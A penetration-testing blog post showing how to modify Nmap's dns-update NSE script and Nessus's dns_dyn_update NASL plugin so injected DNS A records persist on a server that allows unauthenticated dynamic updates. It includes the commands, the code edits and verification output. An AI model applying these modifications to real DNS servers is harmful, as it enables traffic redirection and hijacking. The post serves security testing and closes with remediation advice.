<!DOCTYPE html><html lang="en" data-theme="classic"><head><title>DNS Record Injection using Nmap and Nessus</title><link rel="shortcut icon" href="/assets/img/favicon.ico"><link rel="alternate" type="application/rss+xml" title="All Content Feed" href="https://shellsharks.com/feeds/all-feed.xml"><link rel="alternate" type="application/rss+xml" title="Post Feed" href="https://shellsharks.com/feeds/feed.xml"><link rel="alternate" type="application/rss+xml" title="Scrolls Feed" href="https://shellsharks.com/feeds/scroll-feed.xml"><link rel="alternate" type="application/rss+xml" title="Infosec Feed" href="https://shellsharks.com/feeds/infosec-feed.xml"><link rel="alternate" type="application/rss+xml" title="Notes Feed" href="https://shellsharks.com/feeds/note-feed.xml"><link rel="alternate" type="application/rss+xml" title="Devlogs Feed" href="https://shellsharks.com/feeds/devlog-feed.xml"><link rel="alternate" type="application/rss+xml" title="Links Feed" href="https://shellsharks.com/feeds/link-feed.xml"><link rel="alternate" type="application/rss+xml" title="Captains Log Feed" href="https://shellsharks.com/feeds/log-feed.xml"><link rel="alternate" type="application/rss+xml" title="Social Web Feed" href="https://shellsharks.com/feeds/socialweb-feed.xml"><link rel="alternate" type="application/rss+xml" title="Life Feed" href="https://shellsharks.com/feeds/life-feed.xml"><link rel="blogroll" type="text/xml" href="https://shellsharks.com/assets/rsrc/shellsharks-blogroll.opml"><link type="text/plain" rel="author" href="https://shellsharks.com/humans.txt" /><link rel="canonical" href="https://shellsharks.com/dynamic-dns-injection"><link rel="apple-touch-icon" href="/assets/img/apple-touch-icon.png"><link rel="indieweb" href="/indieweb.txt" /><link href="https://github.com/shellsharks" rel="me"> <!--IndieAuth Provider--><link rel="authorization_endpoint" href="https://indieauth.com/auth"> <!--IndieAuth--><link rel="token_endpoint" href="https://tokens.indieauth.com/token"> <!--IndieAuth token endpoint--> <!--needed for button css--><link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/css/bootstrap.min.css" integrity="sha384-rwoIResjU2yc3z8GV/NPeZWAv56rSmLldC3R/AZzGRnGxQQKnKkoFVhFQhNUwEyJ" crossorigin="anonymous"><link href='/assets/css/style.css' rel='stylesheet' type='text/css'><link href="/assets/css/syntax.css" rel="stylesheet" ><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/@phosphor-icons/web@2.1.1/src/regular/style.css" /><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/@phosphor-icons/web@2.1.1/src/fill/style.css" /><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/@phosphor-icons/web@2.1.1/src/bold/style.css" /><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="author" content="Michael Sass" /><meta name="description" content="Exploiting DNS server dynamic update record injection by weaponizing Nmap NSE scripts and Nessus NASL files." /><meta name="keywords" content="DNS Record Injection using Nmap and Nessus, shellsharks, network, pentesting, dns, nmap, nessus, infosec, tenable, red, python, technical" /><meta content="shellsharks" property="og:site_name" /><meta name="fediverse:creator" content="@shellsharks@shellsharks.social" /><meta name="robots" content="noai, noimageai, noml" /> <!--https://noml.info--> <script> const currentThemeX = localStorage.getItem('theme') ? localStorage.getItem('theme') : null; if (currentThemeX) { document.documentElement.setAttribute('data-theme', currentThemeX); } else if (matchMedia('(prefers-color-scheme: light)').matches) { localStorage.setItem('theme', "light"); } else if (matchMedia('(prefers-color-scheme: dark)').matches) { localStorage.setItem('theme', "classic"); } else { localStorage.setItem('theme', "classic"); } </script><meta content="DNS Record Injection using Nmap and Nessus" property="og:title"><meta content="article" property="og:type"><meta content="Exploiting DNS server dynamic update record injection by weaponizing Nmap NSE scripts and Nessus NASL files." property="og:description"><meta content="https://shellsharks.com/dynamic-dns-injection" property="og:url"><meta content="2019-12-16T09:50:00-05:00" property="article:published_time"><meta content="https://shellsharks.com/about/" property="article:author"><meta content="https://shellsharks-images.s3.amazonaws.com/surfshark.png" property="og:image"> <!--<meta content="https://shellsharks-images.s3.amazonaws.com/shellsharks.png" property="og:image">--><meta content="infosec" property="article:section"><meta content="network" property="article:tag"><meta content="pentesting" property="article:tag"><meta content="dns" property="article:tag"><meta content="nmap" property="article:tag"><meta content="nessus" property="article:tag"><meta content="infosec" property="article:tag"><meta content="tenable" property="article:tag"><meta content="red" property="article:tag"><meta content="python" property="article:tag"><meta content="technical" property="article:tag"> <script src="/assets/js/finrand.js"></script><style> @media (max-width: 2048px) { main { width:66%; } } @media (max-width: 1800px) { main { max-width:800px; width:95%; } } @media (max-width: 768px) { main { width:95%; } }</style><body><div class="container"><heading class="container_item"><style> /* * Made by Erik Terwan * 24th of November 2015 * MIT License * * * If you are thinking of using this in * production code, beware of the browser * prefixes. */ #menuToggle { display: block; position: relative; z-index: 1; -webkit-user-select: none; user-select: none; } #menuToggle a { text-decoration: none; transition: color 0.3s ease; color: var(--contrast-font-color); } .menu_section { color: var(--light-font-color); font-weight: 900; } .menu_section:nth-of-type(n+2) { margin-top:20px; } #menuToggle a:hover { color: var(--link-hover-color); } #menuToggle input { display: block; width: 40px; height: 32px; position: absolute; /*top: -7px;*/ /*left: -5px;*/ cursor: pointer; opacity: 0; /* hide this */ z-index: 2; /* and place it over the hamburger */ -webkit-touch-callout: none; } /* * Just a quick hamburger */ #menuToggle span { display: block; width: 27px; height: 3px; margin-bottom: 4px; position: relative; margin-top:4px; background: var(--font-color); border-radius: 3px; z-index: 1; transform-origin: 4px 0px; transition: transform 0.5s cubic-bezier(0.77,0.2,0.05,1.0), background 0.5s cubic-bezier(0.77,0.2,0.05,1.0), opacity 0.55s ease; } #menuToggle span:first-child { transform-origin: 0% 0%; } #menuToggle span:nth-last-child(2) { transform-origin: 0% 100%; } /* * Transform all the slices of hamburger * into a crossmark. */ #menuToggle input:checked ~ span { opacity: 1; transform: rotate(45deg) translate(-2px, -1px); background: var(--link-hover-color); } /* * But let's hide the middle one. */ #menuToggle input:checked ~ span:nth-last-child(3) { opacity: 0; transform: rotate(0deg) scale(0.2, 0.2); } /* * Ohyeah and the last one should go the other direction */ #menuToggle input:checked ~ span:nth-last-child(2) { transform: rotate(-45deg) translate(0, -1px); } /* * Make this absolute positioned * at the top left of the screen */ #menu { position: absolute; left:-10px; width: 200px; /*fit-content;*/ padding: 10px; margin-top:10px; /*display:none;*/ background: var(--light-background-color); color:var(--font-color); list-style-type: none; -webkit-font-smoothing: antialiased; max-height: calc(80vh); overflow:auto; overscroll-behavior: contain; border-radius: 5px; /* to stop flickering of text in safari */ } /* * And let's slide it in from the left */ #menuToggle input:checked ~ ul { display:block; } .hidden { display: none; }</style><div role="navigation" id="hamburger"><div id="menuToggle"> <input type="checkbox" /> <span></span> <span></span> <span></span><ul id="menu" class="hidden"><li class="menu_section">Main<li><a href="/home/feed" ><i class="ph ph-house"></i> Home Feed</a><li><a href="/about" ><i class="ph ph-identification-card"></i> About</a><li><a href="/feeds" ><i class="ph ph-rss"></i> Feeds</a><li><a href="/activity" ><i class="ph ph-pulse"></i> Activity</a><li><a href="https://shellsharks.social/@shellsharks" target="_blank"><i class="ph ph-mastodon-logo"></i> Mastodon</a><li><a href="mailto:mike@shellsharks.com" ><i class="ph ph-envelope"></i> Email</a><li><a href="https://ko-fi.com/shellsharks" ><i class="ph ph-coffee"></i> Buy me a Coffee</a><li id="themetoggler"><i class="ph ph-swatches" id="themetoggle"></i> Toggle theme<li class="menu_section">Site Nav<li><a href="/scrolls" ><i class="ph ph-scroll"></i> Scrolls Newsletter</a><li><a href="/podcast" ><i class="ph ph-microphone"></i> The Shellsharks Podcast</a><li><a href="/notebook" ><i class="ph ph-note"></i> Notebook</a><li><a href="/blogs" ><i class="ph ph-article"></i> Blogs</a><li><a href="/blogs/infosec" ><i class="ph ph-bug"></i> Infosec Blogs</a><li><a href="/captains-log" ><i class="ph-fill ph-notebook"></i> Captain's Log</a><li><a href="/devlog" ><i class="ph ph-code-block"></i> Devlog</a><li><a href="/linklog" ><i class="ph ph-link"></i> Linklog</a><li><a href="/blogroll" ><i class="ph ph-paint-roller"></i> Blogroll</a><li><a href="/fediverse" ><i class="ph ph-fediverse-logo"></i> Fediverse ‚ÅÇ</a><li><a href="/slashes" ><i class="ph ph-folder-simple-star"></i> Slashes</a><li><a href="/uses" ><i class="ph ph-hammer"></i> Uses</a><li><a href="/now" ><i class="ph ph-clock"></i> Now</a><li><a href="/tags" ><i class="ph ph-tag"></i> Tags</a><li><a href="/statboard" ><i class="ph ph-gauge"></i> Statboard</a><li><a href="/changelog" ><i class="ph ph-arrows-left-right"></i> Change Log</a><li><a href="/interests" ><i class="ph ph-heart"></i> Interests</a><li><a href="/ideas" ><i class="ph ph-lightbulb-filament"></i> Ideas</a><li><a href="/bookmarks" ><i class="ph ph-bookmarks"></i> Bookmarks</a><li><a href="/resume" ><i class="ph ph-read-cv-logo"></i> Resume</a><li><a href="/pro" ><i class="ph ph-seal"></i> Shellsharks Pro</a><li><a href="/sharkweek" ><i class="ph ph-calendar-heart"></i> >Shark Week</a><li><a href="/architecture" ><i class="ph ph-blueprint"></i> Architecture</a><li><a href="/roadmap" ><i class="ph ph-road-horizon"></i> Roadmap</a><li><a href="/tags?tag=bestof#info" ><i class="ph ph-star"></i> Best</a><li><a href="/projects" ><i class="ph ph-compass-tool"></i> Projects</a><li><a href="/now#supporting" ><i class="ph ph-hand-heart"></i> Supports</a><li><a href="/uses#referrals" ><i class="ph ph-hand-arrow-up"></i> Referrals</a><li><a href="/style" ><i class="ph ph-frame-corners"></i> Style</a><li><a href="/.well-known/security.txt" ><i class="ph ph-bug"></i> Report a Bug</a><li><a href="/humans.txt" ><i class="ph ph-user-rectangle"></i> Humans</a><li><a href="/disclaimer" ><i class="ph ph-info"></i> License & Disclaimer</a><li><a href="/privacy" ><i class="ph ph-cookie"></i> Privacy</a><li><a href="/starsharks" ><i class="ph ph-sparkle"></i> Starsharks</a><li><a href="/chipotle" ><i class="ph ph-pepper"></i> Chipotle</a><li><a href="/misc" ><i class="ph ph-paperclip"></i> Junk Drawer</a><li><a href="/ocean" ><i class="ph ph-waves"></i> the Ocean</a><li><a href="/void" ><i class="ph ph-spiral"></i> the Void</a><li class="menu_section">Other<li><a href="/public.pgp" ><i class="ph ph-key"></i> PGP Public Key</a><li><a href="https://infosec.pub/c/cybersecurity" target="_blank"><i class="ph ph-hamburger"></i> Infosec.Pub</a><li><a href="https://malici.ous.computer/@shellsharks" target="_blank"><i class="ph ph-linux-logo"></i> malici.ous.computer</a><li><a href="https://mastodon.social/@sass" target="_blank"><i class="ph-fill ph-mastodon-logo"></i> Mastodon.Social</a><li><a href="https://discord.gg/3rkHgtcYbb" target="_blank"><i class="ph ph-discord-logo"></i> Shellsharks Discord</a><li><a href="https://www.linkedin.com/in/mikesass" target="_blank"><i class="ph ph-linkedin-logo"></i> Linkedin</a><li><a href="/toots/infosec-exchange/shellsharks/" ><i class="ph ph-database"></i> Infosec.exchange Toot Archive</a><li><a href="https://github.com/shellsharks" target="_blank"><i class="ph ph-github-logo"></i> Github</a><li><a href="https://fediverse-webring-enthusiasts.glitch.me/profiles/shellsharks_infosec.exchange/index.html" target="_blank"><i class="ph ph-circle"></i> Webring Enthusiasts</a><li><a href="https://fedia.io/m/cybersecurity" target="_blank"><i class="ph ph-square-half"></i> Fedia.io</a><li><img src="/assets/img/avatar.png" height="50" style="position: relative; display: block; margin:auto; margin-top:20px; margin-bottom:20px;" /></ul></div></div><!-- window.onload = function() { var menuButton = document.getElementById('menuToggle'); var menu = document.getElementById('menu'); menu.classList.add('hidden'); document.getElementById("menuToggle").children[0].checked = false; } --> <script> const menuButton = document.getElementById('menuToggle'); const menu = document.getElementById('menu'); var links = menu.querySelectorAll('a'); menuButton.addEventListener('click', () => { if (!menu.contains(event.target)) { menu.classList.toggle('hidden'); } }); document.addEventListener('click', (event) => { if (!menu.contains(event.target) && !menuButton.contains(event.target)) { menu.classList.add('hidden'); if (document.getElementById("menuToggle").children[0].checked) { document.getElementById("menuToggle").children[0].checked = !document.getElementById("menuToggle").children[0].checked; } } }); links.forEach(function(link) { link.addEventListener('click', function(event) { document.querySelector("#hamburger").click(); }); }); </script> <img id="title_image" src="/assets/img/shellsharks.gif" alt="Shellsharks>_" onclick='window.open("/","_self")'> <span style="float:right;"><a href="/search"><i class="ph-bold ph-magnifying-glass" style="color:var(--font-color); font-size:1.6em; top:-2px;"></i></a></span> </heading><nav class="container_item"><ul id="nav_menu" style="list-style-type:none;padding-left: 10px;"><li class="menu_section">Main<li><a href="/home/feed" ><i class="ph ph-house"></i> Home Feed</a><li><a href="/about" ><i class="ph ph-identification-card"></i> About</a><li><a href="/feeds" ><i class="ph ph-rss"></i> Feeds</a><li><a href="/activity" ><i class="ph ph-pulse"></i> Activity</a><li><a href="https://shellsharks.social/@shellsharks" target="_blank"><i class="ph ph-mastodon-logo"></i> Mastodon</a><li><a href="mailto:mike@shellsharks.com" ><i class="ph ph-envelope"></i> Email</a><li><a href="https://ko-fi.com/shellsharks" ><i class="ph ph-coffee"></i> Buy me a Coffee</a><li id="themetoggler"><i class="ph ph-swatches" id="themetoggle"></i> Toggle theme<li class="menu_section">Site Nav<li><a href="/scrolls" ><i class="ph ph-scroll"></i> Scrolls Newsletter</a><li><a href="/podcast" ><i class="ph ph-microphone"></i> The Shellsharks Podcast</a><li><a href="/notebook" ><i class="ph ph-note"></i> Notebook</a><li><a href="/blogs" ><i class="ph ph-article"></i> Blogs</a><li><a href="/blogs/infosec" ><i class="ph ph-bug"></i> Infosec Blogs</a><li><a href="/captains-log" ><i class="ph-fill ph-notebook"></i> Captain's Log</a><li><a href="/devlog" ><i class="ph ph-code-block"></i> Devlog</a><li><a href="/linklog" ><i class="ph ph-link"></i> Linklog</a><li><a href="/blogroll" ><i class="ph ph-paint-roller"></i> Blogroll</a><li><a href="/fediverse" ><i class="ph ph-fediverse-logo"></i> Fediverse ‚ÅÇ</a><li><a href="/slashes" ><i class="ph ph-folder-simple-star"></i> Slashes</a><li><a href="/uses" ><i class="ph ph-hammer"></i> Uses</a><li><a href="/now" ><i class="ph ph-clock"></i> Now</a><li><a href="/tags" ><i class="ph ph-tag"></i> Tags</a><li><a href="/statboard" ><i class="ph ph-gauge"></i> Statboard</a><li><a href="/changelog" ><i class="ph ph-arrows-left-right"></i> Change Log</a><li><a href="/interests" ><i class="ph ph-heart"></i> Interests</a><li><a href="/ideas" ><i class="ph ph-lightbulb-filament"></i> Ideas</a><li><a href="/bookmarks" ><i class="ph ph-bookmarks"></i> Bookmarks</a><li><a href="/resume" ><i class="ph ph-read-cv-logo"></i> Resume</a><li><a href="/pro" ><i class="ph ph-seal"></i> Shellsharks Pro</a><li><a href="/sharkweek" ><i class="ph ph-calendar-heart"></i> >Shark Week</a><li><a href="/architecture" ><i class="ph ph-blueprint"></i> Architecture</a><li><a href="/roadmap" ><i class="ph ph-road-horizon"></i> Roadmap</a><li><a href="/tags?tag=bestof#info" ><i class="ph ph-star"></i> Best</a><li><a href="/projects" ><i class="ph ph-compass-tool"></i> Projects</a><li><a href="/now#supporting" ><i class="ph ph-hand-heart"></i> Supports</a><li><a href="/uses#referrals" ><i class="ph ph-hand-arrow-up"></i> Referrals</a><li><a href="/style" ><i class="ph ph-frame-corners"></i> Style</a><li><a href="/.well-known/security.txt" ><i class="ph ph-bug"></i> Report a Bug</a><li><a href="/humans.txt" ><i class="ph ph-user-rectangle"></i> Humans</a><li><a href="/disclaimer" ><i class="ph ph-info"></i> License & Disclaimer</a><li><a href="/privacy" ><i class="ph ph-cookie"></i> Privacy</a><li><a href="/starsharks" ><i class="ph ph-sparkle"></i> Starsharks</a><li><a href="/chipotle" ><i class="ph ph-pepper"></i> Chipotle</a><li><a href="/misc" ><i class="ph ph-paperclip"></i> Junk Drawer</a><li><a href="/ocean" ><i class="ph ph-waves"></i> the Ocean</a><li><a href="/void" ><i class="ph ph-spiral"></i> the Void</a><li class="menu_section">Other<li><a href="/public.pgp" ><i class="ph ph-key"></i> PGP Public Key</a><li><a href="https://infosec.pub/c/cybersecurity" target="_blank"><i class="ph ph-hamburger"></i> Infosec.Pub</a><li><a href="https://malici.ous.computer/@shellsharks" target="_blank"><i class="ph ph-linux-logo"></i> malici.ous.computer</a><li><a href="https://mastodon.social/@sass" target="_blank"><i class="ph-fill ph-mastodon-logo"></i> Mastodon.Social</a><li><a href="https://discord.gg/3rkHgtcYbb" target="_blank"><i class="ph ph-discord-logo"></i> Shellsharks Discord</a><li><a href="https://www.linkedin.com/in/mikesass" target="_blank"><i class="ph ph-linkedin-logo"></i> Linkedin</a><li><a href="/toots/infosec-exchange/shellsharks/" ><i class="ph ph-database"></i> Infosec.exchange Toot Archive</a><li><a href="https://github.com/shellsharks" target="_blank"><i class="ph ph-github-logo"></i> Github</a><li><a href="https://fediverse-webring-enthusiasts.glitch.me/profiles/shellsharks_infosec.exchange/index.html" target="_blank"><i class="ph ph-circle"></i> Webring Enthusiasts</a><li><a href="https://fedia.io/m/cybersecurity" target="_blank"><i class="ph ph-square-half"></i> Fedia.io</a></ul></nav><main class="container_item"><div class="pageheader"></div><article class="post h-entry"><header class="post-header"><h1 class="post-title p-name" id="title" style="display:inline;">DNS Record Injection using Nmap and Nessus</h1><span style="color:#CA3342;font-size:4em;line-height: 20px;">.</span></header><!--<div id="postinfo"> <span class="time"><i class="ph ph-note-pencil"></i> by <span class="hov p-author h-card">Mike Sass</span> <a href="/about" rel="author"><img class="u-photo" src="https://shellsharks-images.s3.amazonaws.com/surfshark.png" style="display:inline; height:1em;" /></a></span><br/> <br/> <span class="categories"> &raquo; infosec, blog </span></div>--><div class="post-content e-content" style="margin-top: 30px;"><p>On a penetration test or as a result of a vulnerability scan you may encounter a ‚ÄúDNS Server Dynamic Update Record Injection‚Äù finding. <a href="https://www.tenable.com/products/nessus">Nessus</a> for example, is one such vulnerability scanner that can identify <a href="https://www.tenable.com/plugins/nessus/35372">this issue</a>. This vulnerability allows anyone with access to the afflicted DNS server (over UDP port 53) the ability to add or even <strong>remove</strong> DNS records to/from a zone. The danger of this vulnerability, put simply by the <a href="https://www.tenable.com/plugins/nessus/35372">Nessus plugin</a> itself is‚Ä¶ ‚ÄúThis protocol ‚Ä¶ could be subverted by malicious users to redirect network traffic.‚Äù<p>OK, so Nessus has identified the vulnerability - great! As a penetration tester, you may be interested in exploring that vulnerability further. Let‚Äôs start digging into this by taking a closer look at the Nessus plugin itself. When found, the Nessus plugin will output‚Ä¶ ‚ÄúNessus was able to register a new A record into the following zone: [ZONE]‚Äù. This is an interesting message as it expresses that Nessus was actually able to <em>ADD</em> a record. What is unclear is whether that record was subsequently deleted or what the record details were (e.g. hostname, IP, etc‚Ä¶) Without more control over how the Nessus plugin is executed we may not be able to take advantage of it for our malicious purposes. Instead, let‚Äôs take a look at <a href="https://nmap.org">Nmap</a> and see if it has anything we can use‚Ä¶<h1 id="nmap-arsenal">Nmap Arsenal</h1><p>It turns out Nmap has functionality very similar to the <em>DNS Server Dynamic Update Record Injection</em> plugin from Nessus. With a standard install, Nmap contains a suite of <a href="https://nmap.org/book/nse.html">NSE scripts</a> (in <em>/usr/share/nmap/scripts</em> on Kali), one of which is named <strong>dns-update.nse</strong>. When the <a href="https://nmap.org/nsedoc/scripts/dns-update.html">dns-update.nse</a> script is run against the vulnerable DNS server the output specifies that a record is successfully added and then subsequently deleted. (Syntax for running the NSE script and the output is shown below).<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sU</span> <span class="nt">-p</span> 53 <span class="nt">--script</span><span class="o">=</span>dns-update <span class="nt">--script-args</span><span class="o">=</span>dns-update.hostname<span class="o">=[</span>new <span class="nb">hostname</span><span class="o">]</span>,dns-update.ip<span class="o">=[</span>new ip] <span class="o">[</span>DNS server ip]

PORT   STATE SERVICE
53/udp open  domain
| dns-update:
|   Successfully added the record <span class="s2">"nmap-test.cqure.net"</span>
|_  Successfully deleted the record <span class="s2">"nmap-test.cqure.net"</span>
</code></pre></div></div><p>Similar to the Nessus plugin, this NSE script can add a record to the zone but unlike the Nessus plugin, this script also lets us know what the hostname value of the record was and lets us know that the record was ALSO deleted. With this information in hand, let‚Äôs peek into the <a href="https://svn.nmap.org/nmap/scripts/dns-update.nse">NSE script code</a> and see if we can‚Äôt get a better idea of what it is doing and how we might modify it to add a record of our choosing.<p>After a closer inspection, I found that by commenting out a few lines of code in the NSE script I could remove the logic which deletes the A record after it had been added. The code to comment out is shown below‚Ä¶<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">...</span>
<span class="kd">local</span> <span class="n">status</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">dns</span><span class="p">.</span><span class="n">update</span><span class="p">(</span> <span class="n">name</span><span class="p">,</span> <span class="p">{</span> <span class="n">host</span><span class="o">=</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="n">port</span><span class="p">,</span> <span class="n">dtype</span><span class="o">=</span><span class="s2">"A"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">ip</span> <span class="p">}</span> <span class="p">)</span>

<span class="k">if</span> <span class="p">(</span> <span class="n">status</span> <span class="p">)</span> <span class="k">then</span>
    <span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="p">{}</span>
    <span class="nb">table.insert</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="p">(</span><span class="s2">"Successfully added the record \"</span><span class="o">%</span><span class="n">s</span><span class="err">\</span><span class="s2">""</span><span class="p">):</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">))</span>
    <span class="c1">--local status = dns.update( name, { host=host, port=port, dtype="A", data="", ttl=0 } )</span>
    <span class="c1">--if ( status ) then</span>
    <span class="c1">--  table.insert(result, ("Successfully deleted the record \"%s\""):format(name))</span>
    <span class="c1">--else</span>
      <span class="nb">table.insert</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="p">(</span><span class="s2">"Failed to delete the record \"</span><span class="o">%</span><span class="n">s</span><span class="err">\</span><span class="s2">""</span><span class="p">):</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">))</span>
<span class="o">...</span>
</code></pre></div></div><p>So now, by re-running the script ‚Äú<em>nmap -sU -p 53 ‚Äìscript=dns-update ‚Äìscript-args=dns-update.hostname=[new hostname],dns-update.ip=[new ip] [DNS server ip]</em>‚Äù you will be able to add a hostname without having that hostname deleted afterwards. This can be further verified using the <em>nslookup</em> command‚Ä¶<p>Setting DNS server to use in interactive Nslookup prompt‚Ä¶<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># nslookup</span>
<span class="o">&gt;</span> server <span class="o">[</span>DNS server ip - <span class="k">for </span>example 10.10.10.10]
Default server: 10.10.10.10
Address: 10.10.10.10#53
</code></pre></div></div><p>Before running the NSE script exploit, the record you wish to inject will not be present.<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="o">[</span><span class="nb">hostname</span><span class="o">]</span>.[zone]
Server:   10.10.10.10
Address:  10.10.10.10#53

<span class="k">***</span> server can<span class="s1">'t find test.zone: SERVFAIL
</span></code></pre></div></div><p>After running the NSE script exploit you will see your injected record successfully resolves.<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="o">[</span><span class="nb">hostname</span><span class="o">]</span>.[zone]
Server:   10.10.10.10
Address:  10.10.10.10#53

Name:     test.zone
Address:  127.1.2.3
</code></pre></div></div><p>From here, you can being subsequent exploitation by having traffic routed to a domain of your choosing!<h1 id="weaponizing-nessus">Weaponizing Nessus</h1><p>With just a little bit of know-how, it is also possible to modify the Nessus plugin in a similar way to how we modified the Nmap NSE script to achieve the DNS record injection.<p>First, on a box with Nessus installed, list all plugins (stored in <em>/opt/nessus/lib/nessus/plugins</em>) and then search for the <em>plugin ID</em> (which is 35372).<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> /opt/nessus/lib/nessus/plugins | <span class="nb">grep</span> <span class="nt">-iR</span> <span class="s2">"script_id(35372)"</span>

dns_dyn_update.nasl: script_id<span class="o">(</span>35372<span class="o">)</span>
</code></pre></div></div><p>Here you‚Äôll see one result - ‚Äú<em>dns_dyn_update.nasl</em>‚Äù. The <a href="https://en.wikipedia.org/wiki/Nessus_Attack_Scripting_Language">Nessus Attack Scripting Language</a> or <em>NASL</em> files are Nessus‚Äô way of running its respective plugins. Taking a closer look at this file, I identified just a few code modifications needed to allow me to add a DNS record of my choosing without it being deleted afterwards. These code modifications are shown below‚Ä¶<p>To add a hostname record, modify the following portions of code. (I recommend making a copy of the NASL file before modifying.)<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="bp">...</span>
<span class="n">pkt</span> <span class="o">+=</span> <span class="nf">raw_string</span><span class="p">(</span>
  <span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span>             <span class="c1"># Data length
</span>  <span class="p">[</span><span class="n">ip</span> <span class="n">separated</span> <span class="n">by</span> <span class="n">commas</span> <span class="o">-</span> <span class="mi">127</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">]);</span> <span class="c1">#Square brackets are not part of the code
</span><span class="k">return</span> <span class="n">pkt</span><span class="p">;</span>
<span class="bp">...</span>
<span class="n">dynname</span> <span class="o">=</span> <span class="sh">"</span><span class="s">[hostname]</span><span class="sh">"</span><span class="p">;</span>
<span class="bp">...</span>
<span class="c1">#pkt = dns_update_A(zone: zone, dynname, delete: 1);  #COMMENT THIS LINE OUT
#send(socket:soc, data: pkt);                         #COMMENT THIS LINE OUT
</span><span class="bp">...</span>
</code></pre></div></div><p>Once the code has been modified, the script can be run directly using the <em>nasl</em> <a href="https://www.tenable.com/blog/using-the-nasl-nessus-command-line-tool">utility</a> included with the Nessus install.<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/nessus/bin/nasl <span class="nt">-t</span> <span class="o">[</span>target DNS server] /opt/nessus/lib/nessus/plugins/dns_dyn_update.nasl <span class="nt">-M</span>

<span class="o">==========[</span> Executing dns_server.nasl <span class="o">]======</span>
dns_server.nasl: Success
dns_server.nasl: Success
<span class="nt">----------</span><span class="o">[</span> Finished dns_server.nasl 16msec <span class="o">]</span><span class="nt">------</span>
<span class="o">==========[</span>Executing bind_hostname.nasl <span class="o">]======</span>
<span class="nt">----------</span><span class="o">[</span> Finished bind_hostname.nasl 13msec <span class="o">]</span><span class="nt">------</span>
<span class="o">==========[</span>Executing /opt/nessus/lib/nessus/plugins/dns_dyn_update.nasl]<span class="o">======</span>

Nessus was able to register a new A record into the following zone :

<span class="o">[</span>hostname.zone]

<span class="nt">----------</span><span class="o">[</span> Finished /opt/nessus/lib/nessus/plugins/dns_dyn_update.nasl 17msec <span class="o">]</span><span class="nt">------</span>
</code></pre></div></div><p>To then delete a hostname record simply uncomment the previously commented lines and re-run the NASL script‚Ä¶<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#pkt = dns_update_A(zone: zone, dynname, delete: 1);
#send(socket:soc, data: pkt);
</span></code></pre></div></div><h1 id="closing-thoughts">Closing Thoughts</h1><ul><li><p>As you can see, Nmap and Nessus definitely have some offensive capability which extends past your typical recon/enumeration/vulnerability scanning typically thought of when considering these two tools. With over 100k plugins/NASL files provided in Nessus (of course not all of which are ‚Äúexploitable‚Äù) and another 590 NSE scripts which come with Nmap, there is a lot of potential for leveraging pre-built exploits for your own work.<li><p>Despite Tenable claiming (via it‚Äôs <em>Security Center</em> product) that there is no exploit available for this vulnerability, you now know that there <em>definitely</em> is. What‚Äôs funny here is Nessus states that it was able to exploit the vulnerability and then proceeds to claim that there is no exploit.<li><p>Update your DNS servers if you find this vulnerability! Tenable classifies this as a <strong>Medium</strong> risk issue though I personally think this is <strong>High</strong> risk.</ul><p>Thanks for reading!</div></article><hr class="fin"><div id="poststats" class="containbox" style="margin: auto;"> <span class="time"><i class="ph ph-calendar-dot"></i> Published: <span class="dt-published">December 16, 2019</span></span> <a class="u-url u-uid" href></a><br> <span class="categories"><i class="ph ph-tag"></i> Tags: <span class="primarybg" style="border-radius:15px;padding:0px 5px 0px 5px;"><a class="p-category" href="/tags?tag=network">#network</a></span> <span class="primarybg" style="border-radius:15px;padding:0px 5px 0px 5px;"><a class="p-category" href="/tags?tag=pentesting">#pentesting</a></span> <span class="primarybg" style="border-radius:15px;padding:0px 5px 0px 5px;"><a class="p-category" href="/tags?tag=dns">#dns</a></span> <span class="primarybg" style="border-radius:15px;padding:0px 5px 0px 5px;"><a class="p-category" href="/tags?tag=nmap">#nmap</a></span> <span class="primarybg" style="border-radius:15px;padding:0px 5px 0px 5px;"><a class="p-category" href="/tags?tag=nessus">#nessus</a></span> <span class="primarybg" style="border-radius:15px;padding:0px 5px 0px 5px;"><a class="p-category" href="/tags?tag=infosec">#infosec</a></span> <span class="primarybg" style="border-radius:15px;padding:0px 5px 0px 5px;"><a class="p-category" href="/tags?tag=tenable">#tenable</a></span> <span class="primarybg" style="border-radius:15px;padding:0px 5px 0px 5px;"><a class="p-category" href="/tags?tag=red">#red</a></span> <span class="primarybg" style="border-radius:15px;padding:0px 5px 0px 5px;"><a class="p-category" href="/tags?tag=python">#python</a></span> <span class="primarybg" style="border-radius:15px;padding:0px 5px 0px 5px;"><a class="p-category" href="/tags?tag=technical">#technical</a></span> </span><br/> <span class="time"><i class="ph ph-pencil"></i> Word count: 1332</span> <span class="p-summary" style="display:none;">Exploiting DNS server dynamic update record injection by weaponizing 